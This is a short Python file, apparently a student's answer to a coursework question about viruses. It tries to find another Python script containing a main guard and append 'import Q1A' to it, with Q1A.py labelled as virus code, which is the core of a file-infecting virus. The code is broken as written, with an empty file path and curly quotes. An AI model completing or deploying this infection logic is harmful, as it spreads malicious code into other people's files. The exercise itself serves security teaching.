#Q1B.py


# “receives as a command line” - run by typing in Q1B.py(“file.py”) ?

# “For our purposes, a Python file is considered a script if it contains an if __name__ == "__main__": statement”

import os
searchstring = ‘if __name__ == “__main__”’
#viruscode = ‘Q1A.py’


filetosearch = input(“Searching for file called: “)

with open(‘’, ‘r’) as file:
	contents = open(__file__,’r’)
	if (searchstring in contents) and (‘Q1A.py’ not in contents):
		with open(filetosearch, ‘a’) as file:
			file.write(‘import Q1A’)
			file.write(‘\n’)
